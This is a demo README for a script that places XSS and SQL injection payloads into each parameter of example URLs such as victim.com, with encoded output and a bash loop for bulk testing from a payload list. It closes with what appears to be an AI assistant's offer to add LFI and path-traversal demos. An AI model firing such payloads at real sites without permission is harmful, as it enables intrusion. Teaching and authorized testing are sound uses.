# 💥 Payload Visualizer – Demo

This demo shows how to use the `visualize.py` script to understand how payloads are injected into target URLs.

---

## 🧪 Example 1: XSS Injection

### Command
```bash
python visualize.py --url "http://victim.com/search?q=hello&lang=en" --payload "<script>alert('XSS')</script>"

Output

[+] Injected on 'q':
    http://victim.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&lang=en

[+] Injected on 'lang':
    http://victim.com/search?q=hello&lang=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

🧪 Example 2: SQL Injection
Command

python visualize.py --url "http://target.com/login?user=admin&pass=1234" --payload "' OR '1'='1"

Output

[+] Injected on 'user':
    http://target.com/login?user=%27+OR+%271%27%3D%271&pass=1234

[+] Injected on 'pass':
    http://target.com/login?user=admin&pass=%27+OR+%271%27%3D%271

🛠️ Pro Tip

For bulk testing:

cat payloads/xss.txt | while read payload; do
  python visualize.py --url "http://test.com/page?input=123" --payload "$payload"
done

⚠️ Disclaimer

This tool is for educational and ethical use only. Do not use it against systems without permission.


---

Let me know if you want a second version that includes screenshots, ASCII trees, or colorized outputs using `rich`. I can also add more demo types like LFI, path traversal, or include real-world test sites like `vulnerable-php-app` style.
